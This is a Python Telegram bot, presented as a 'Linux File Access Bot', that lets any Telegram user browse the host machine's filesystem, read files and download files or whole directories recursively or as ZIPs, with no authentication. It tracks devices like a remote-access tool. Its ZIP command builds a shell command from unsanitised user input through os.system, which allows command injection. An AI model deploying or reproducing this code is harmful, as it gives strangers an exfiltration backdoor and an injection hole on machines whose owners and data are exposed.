import os
import socket
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
from multiprocessing.pool import ThreadPool

BOT_TOKEN = 'TELEGRAM_BOT_TOKEN'

# Dictionary to track online devices
devices = {}

# Device counter for assigning IDs
device_counter = 1

# Function to update the device status and info
def update_device_status(device_id, name, os, ip, status):
    devices[device_id] = {'name': name, 'os': os, 'ip': ip, 'status': status}

# /start command to list all devices
def start(update, context):
    global devices, device_counter
    user_id = update.effective_chat.id

    # Get current device information
    hostname = socket.gethostname()
    os_version = os.uname().release
    ip_address = socket.gethostbyname(hostname)

    # Update this bot's device information with a new device ID
    update_device_status(device_counter, hostname, os_version, ip_address, 'online')

    # Increment the device counter for the next device
    device_counter += 1

    # Welcome message
    welcome_message = f"Welcome to the Linux File Access Bot, Unknown User! :)\n\n"

    # Instructions and commands
    instructions = "Available commands:\n"
    instructions += "/start - Display welcome message and instructions\n"
    instructions += "/select <device_id> - Select a device\n"
    instructions += "/unselect - Unselect the current device\n"
    instructions += "/ls - List files in the current directory\n"
    instructions += "/cat <filename> - Read the content of a file\n"
    instructions += "/get <filename> - Download a file\n"
    instructions += "/get_dir_zip <directory> - Download an entire directory as a ZIP\n"
    instructions += "/get_dir <directory> - Download an entire directory recursively\n"
    instructions += "/structure - Display the directory structure\n"
    instructions += "/cdx - Go up one directory\n"
    instructions += "/cd <directory> - Go into the specified directory\n"

    # List online devices
    online_devices = "\nOnline Devices:\n"
    online_devices += "\n".join(
        [f"Device {id}: {info['name']} - {info['os']} (IP: {info['ip']})"
         for id, info in devices.items() if info['status'] == 'online']
    ) or "No devices online."

    context.bot.send_message(chat_id=user_id, text=welcome_message + instructions + "\n" + online_devices)

# Command to select a device
def select_device(update, context):
    device_id = int(context.args[0])  # Get device ID from the command
    if device_id in devices:
        devices[device_id]['status'] = 'selected'
        context.bot.send_message(chat_id=update.effective_chat.id, text=f"Device {device_id} selected.")
    else:
        context.bot.send_message(chat_id=update.effective_chat.id, text="Device not found.")

# Command to unselect a device
def unselect_device(update, context):
    for device_id, info in devices.items():
        if info['status'] == 'selected':
            devices[device_id]['status'] = 'online'
            context.bot.send_message(chat_id=update.effective_chat.id, text=f"Device {device_id} unselected.")
            break
    else:
        context.bot.send_message(chat_id=update.effective_chat.id, text="No device is selected.")

# Command to list files in the current directory
def list_files(update, context):
    files = os.listdir()
    file_list = '\n'.join(files)
    context.bot.send_message(chat_id=update.effective_chat.id, text=file_list)

# Command to read file content
def read_file(update, context):
    file_name = ' '.join(context.args)
    try:
        with open(file_name, 'r') as file:
            content = file.read()
            context.bot.send_message(chat_id=update.effective_chat.id, text=content)
    except FileNotFoundError:
        context.bot.send_message(chat_id=update.effective_chat.id, text="File not found.")

# Command to get a file
def get_file(update, context):
    file_name = ' '.join(context.args)
    try:
        with open(file_name, 'rb') as file:
            context.bot.send_document(chat_id=update.effective_chat.id, document=file)
    except FileNotFoundError:
        context.bot.send_message(chat_id=update.effective_chat.id, text="File not found.")

# Command to get directory as a ZIP
def get_dir_zip(update, context):
    directory = ' '.join(context.args)
    try:
        zip_file_name = f"{directory}.zip"
        os.system(f"zip -r {zip_file_name} {directory}")

        with open(zip_file_name, 'rb') as zip_file:
            context.bot.send_document(chat_id=update.effective_chat.id, document=zip_file)

        os.remove(zip_file_name)

    except FileNotFoundError:
        context.bot.send_message(chat_id=update.effective_chat.id, text="Directory not found.")

# Command to get directory recursively
def get_dir(update, context):
    directory = ' '.join(context.args)
    try:
        for root, dirs, files in os.walk(directory):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                with open(file_path, 'rb') as file:
                    context.bot.send_document(chat_id=update.effective_chat.id, document=file)
    except FileNotFoundError:
        context.bot.send_message(chat_id=update.effective_chat.id, text="Directory not found.")

# Command to display directory structure
def display_directory_structure(update, context):
    structure = os.walk('.')
    structure_str = ''
    for root, dirs, files in structure:
        structure_str += f"{root}:\n"
        structure_str += f"  Directories: {', '.join(dirs)}\n"
        structure_str += f"  Files: {', '.join(files)}\n"
    context.bot.send_message(chat_id=update.effective_chat.id, text=structure_str)

# Command to go up one directory
def go_up_directory(update, context):
    os.chdir('..')
    context.bot.send_message(chat_id=update.effective_chat.id, text="Moved up one directory.")

# Command to go into a directory
def go_into_directory(update, context):
    directory = ' '.join(context.args)
    try:
        os.chdir(directory)
        context.bot.send_message(chat_id=update.effective_chat.id, text=f"Moved into directory: {directory}")
    except FileNotFoundError:
        context.bot.send_message(chat_id=update.effective_chat.id, text="Directory not found.")

# Main function to run the bot
def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler('start', start))
    dp.add_handler(CommandHandler('select', select_device, pass_args=True))
    dp.add_handler(CommandHandler('unselect', unselect_device))
    dp.add_handler(CommandHandler('ls', list_files))
    dp.add_handler(CommandHandler('cat', read_file, pass_args=True))
    dp.add_handler(CommandHandler('get', get_file, pass_args=True))
    dp.add_handler(CommandHandler('get_dir_zip', get_dir_zip, pass_args=True))
    dp.add_handler(CommandHandler('get_dir', get_dir, pass_args=True))
    dp.add_handler(CommandHandler('structure', display_directory_structure))
    dp.add_handler(CommandHandler('cdx', go_up_directory))
    dp.add_handler(CommandHandler('cd', go_into_directory, pass_args=True))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
